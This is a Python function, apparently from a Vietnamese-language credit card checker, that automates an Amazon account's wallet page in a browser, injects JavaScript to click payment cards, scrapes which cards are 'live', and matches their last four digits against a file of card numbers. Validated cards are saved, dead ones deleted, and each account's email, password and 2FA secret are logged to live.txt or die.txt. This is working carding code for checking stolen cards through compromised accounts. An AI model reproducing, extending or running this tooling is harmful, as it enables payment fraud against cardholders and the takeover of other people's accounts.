def check_and_save_cards(page, email, cred, start_line, end_line):
    skip_img_srcs = [
        "41MGiaNMk5L._SL85_.png",
        "81NBfFByidL._SL85_.png"
    ]

    def click_cards_by_img_src():
        script = f'''
        (() => {{
            const skipImgs = {skip_img_srcs};
            let clickedCount = 0;
            const cardDivs = Array.from(document.querySelectorAll('div.a-section.apx-wallet-selectable-payment-method-tab'));
            for (const cardDiv of cardDivs) {{
                const img = cardDiv.querySelector('img.apx-wallet-selectable-image');
                if (!img) continue;
                for (const skipSrc of skipImgs) {{
                    if (img.src.includes(skipSrc)) {{
                        cardDiv.click();
                        clickedCount++;
                        break;
                    }}
                }}
            }}
            return clickedCount;
        }})();
        '''
        return page.evaluate(script)

    def count_live_cards(soup):
        container_divs = soup.select(
            'div.a-row.apx-wallet-desktop-payment-method-selectable-tab-css > '
            'div.a-scroller.apx-wallet-desktop-payment-method-selectable-tab-css.a-scroller-vertical > '
            'div.a-row.apx-wallet-desktop-payment-method-selectable-tab-inner-css > '
            'div.a-section.apx-wallet-selectable-payment-method-tab'
        )
        live_cards = []
        for card_div in container_divs:
            img_tag = card_div.find('img', class_='apx-wallet-selectable-image')
            img_src = img_tag['src'] if img_tag else ''
            if any(skip_img in img_src for skip_img in skip_img_srcs):
                continue
            live_cards.append(card_div)
        return live_cards

    def extract_last4(cards):
        last4s = []
        for card in cards:
            text = card.get_text(strip=True)
            match = re.search(r'(\d{4})$', text)
            if match:
                last4s.append(match.group(1))
        return set(last4s)

    max_clicks = 6
    attempt = 0

    live_cards_prev = []
    live_last4_prev = set()

    # Lần đầu tiên: vào trang, đợi 20s, click lần 1, đợi 10s
    print(f"{COLORS['CYAN']}\x1b[93m[ \x1b[35mSU WO \x1b[93m] \x1b[32m> Tải load cho tài khoản \x1b[93m{email} {COLORS['RESET']}")
    page.goto('https://www.amazon.com/cpe/yourpayments/wallet')
    time.sleep(20)

    clicked = click_cards_by_img_src()
    print(f"{COLORS['CYAN']}Đang cập nhật dữ liệu check live {clicked} {COLORS['RESET']}")
    time.sleep(10)

    content = page.content()
    soup = BeautifulSoup(content, 'html.parser')
    live_cards_current = count_live_cards(soup)
    live_last4_current = extract_last4(live_cards_current)
    live_count_current = len(live_cards_current)
    print(f"{COLORS['CYAN']}\x1b[93m[ \x1b[35mSU WO \x1b[93m] \x1b[32m> Tìm thấy \x1b[93m{live_count_current} \x1b[32mthẻ live để check thêm{COLORS['RESET']}")

    live_cards_prev = live_cards_current
    live_last4_prev = live_last4_current
    attempt = 1

    while attempt < max_clicks:
        print(f"{COLORS['CYAN']}\x1b[93m[ \x1b[35mSU WO \x1b[93m] \x1b[32m>Load thêm lần \x1b[93m{attempt + 1} \x1b[32mcho tài khoản \x1b[93m{email} {COLORS['RESET']}")
        page.goto('https://www.amazon.com/cpe/yourpayments/wallet')
        time.sleep(10)  # đợi 10s trước khi click

        clicked = click_cards_by_img_src()
        print(f"\x1b[93m[ \x1b[35mSU WO \x1b[93m] \x1b[32m>Đã load các thẻ lần thứ {attempt + 1}.")
        time.sleep(10)  # đợi 10s sau click

        content = page.content()
        soup = BeautifulSoup(content, 'html.parser')
        live_cards_current = count_live_cards(soup)
        live_last4_current = extract_last4(live_cards_current)
        live_count_current = len(live_cards_current)
        print(f"\x1b[93m[ \x1b[35mSU WO \x1b[93m] \x1b[32m>Lần {attempt + 1} Load được {live_count_current} thẻ live.")

        # Cập nhật live cards để lần tiếp theo so sánh, dù không dùng để dừng sớm
        live_cards_prev = live_cards_current
        live_last4_prev = live_last4_current
        attempt += 1

    if attempt == max_clicks and len(live_cards_prev) == 0:
        print(f"{COLORS['RED']}Vẫn đang check thẻ {max_clicks} tiếp tục xử lý với dữ liệu hiện tại.{COLORS['RESET']}")

    # Xử lý phần check và ghi file như cũ với live_cards_prev

    total_cards = len(soup.select(
        'div.a-row.apx-wallet-desktop-payment-method-selectable-tab-css > '
        'div.a-scroller.apx-wallet-desktop-payment-method-selectable-tab-css.a-scroller-vertical > '
        'div.a-row.apx-wallet-desktop-payment-method-selectable-tab-inner-css > '
        'div.a-section.apx-wallet-selectable-payment-method-tab'
    ))
    skip_count = total_cards - len(live_cards_prev)

    print(f"{COLORS['BLUE']}\x1b[93m[ \x1b[35mSU WO \x1b[93m] \x1b[32m> Tài Khoản \x1b[93m{email} \x1b[96mCó Tổng thẻ: \x1b[93m{total_cards} \x1b[31mThẻ Die: \x1b[93m{skip_count} \x1b[32mThẻ live: \x1b[93m{len(live_cards_prev)}{COLORS['RESET']}")

    live_cards_last4 = list(live_last4_prev)

    if len(live_cards_prev) > 0:
        log_to_file('live.txt', email, cred['password'], cred['2fa'])
    else:
        print(f"{COLORS['RED']} Không tìm thấy thẻ hợp lệ nào trên tài khoản \x1b[93m{email}. DIE.{COLORS['RESET']}")
        log_to_file('die.txt', email, cred['password'], cred['2fa'])

    with open(card_file_path, 'r') as f:
        lines = f.readlines()

    lines_to_check = lines[start_line:end_line]

    live_lines = []
    die_lines = []

    for line in lines_to_check:
        line = line.strip()
        if not line:
            continue
        card_num = line.split('|')[0]
        if len(card_num) < 4:
            continue
        last4_line = card_num[-4:]
        if last4_line in live_cards_last4:
            live_lines.append(line)
        else:
            die_lines.append(line)

    if live_lines:
        save_live_cards_to_file(live_lines, email)

    if die_lines:
        remove_lines_from_card_txt(die_lines)

    print(f"{COLORS['GREEN']}\x1b[93m[ \x1b[35mSU WO \x1b[93m] \x1b[32m> Xử lý xong thêm thẻ cho tài khoản \x1b[93m{email}{COLORS['RESET']}")
